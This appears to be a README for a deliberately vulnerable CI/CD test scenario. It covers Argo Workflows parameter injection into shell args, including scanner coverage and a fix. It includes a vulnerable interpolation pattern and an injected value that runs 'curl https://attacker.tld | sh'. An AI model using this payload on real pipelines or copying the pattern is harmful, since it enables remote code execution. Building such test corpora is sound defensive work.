# Scenario 74: Argo — `{{inputs.parameters.*}}` injected into args

**Provider:** Argo Workflows · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`workflow.yaml`](workflow.yaml)

## The pattern

```yaml
container:
  command: [sh, -c]
  args: ["echo {{inputs.parameters.msg}}"]
```

An Argo template interpolates an `{{inputs.parameters.*}}` (or
`{{workflow.parameters.*}}`) value directly into its `args`/`source`. Workflow
parameters can carry attacker-controlled input (e.g. from an event-driven
trigger), so the parameter becomes shell syntax.

## How an attacker exploits it

A `msg` parameter set to `x; curl https://attacker.tld | sh` executes that
command in the container. Argo analogue of the expression-injection family
(scenarios 02 / 56 / 62 / 71).

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `ARGO-005` — Argo input parameter interpolated unsafely in script / args |
| Checkov | — (its `CKV_ARGO_*` rules cover SA / non-root, not injection) |

## Fix

Don't interpolate parameters into `args`/`source`. Pass them as container `env`
and reference quoted (`"$MSG"`), or feed them as arguments to a fixed program
rather than building a shell string.

## References

- Argo — Workflow variables: https://argo-workflows.readthedocs.io/en/latest/variables/
